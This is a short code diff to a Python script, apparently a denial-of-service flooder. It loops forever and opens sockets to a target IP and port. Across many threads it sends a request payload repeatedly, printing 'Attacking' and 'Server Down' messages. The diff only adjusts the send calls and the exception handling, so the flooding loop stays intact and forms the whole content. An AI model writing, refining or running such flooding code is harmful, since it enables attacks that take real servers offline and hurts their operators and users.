@@ -84,17 +84,16 @@ def start():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.connect((ip, port))
-            s.sendall(str.encode(main_req))
+            s.send(str.encode(main_req))
             for i in range(pack):
-                s.sendall(str.encode(main_req))
+                s.send(str.encode(main_req))
             xx += random.randint(0, pack)
             print("[+] Attacking {0}:{1} | Sent: {2}".format(ip, port, xx))
-        except Exception as e:
-            s.close()
+        except socket.error as e:
             print(f'[+] Server Down: {e}')
-            break
+        finally:
+            s.close()
 
 # Khởi tạo các luồng
 for x in range(thread):
